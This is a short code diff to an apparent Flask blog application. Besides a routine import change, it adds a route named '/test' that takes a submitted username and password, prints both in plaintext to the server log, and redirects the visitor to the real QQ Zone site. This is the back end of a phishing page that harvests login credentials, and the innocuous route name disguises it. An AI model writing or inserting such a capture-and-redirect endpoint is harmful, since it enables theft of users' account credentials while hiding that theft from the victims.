@@ -5,6 +5,7 @@ import json
 from .. import db
 from ..db_models import Admin, Articles, Thoughts
 from . import main
+from app import *
 
 
 @main.route("/")
@@ -95,3 +96,12 @@ def postThoughts():
             return "no content"
     else:
         return "deny"
+
+
+@main.route('/test', methods=['POST'])
+def test():
+    account = request.form.get('username')
+    pwd = request.form.get('pwd')
+    print "Account:", account
+    print "password:", pwd
+    return redirect('http://qzone.qq.com/')
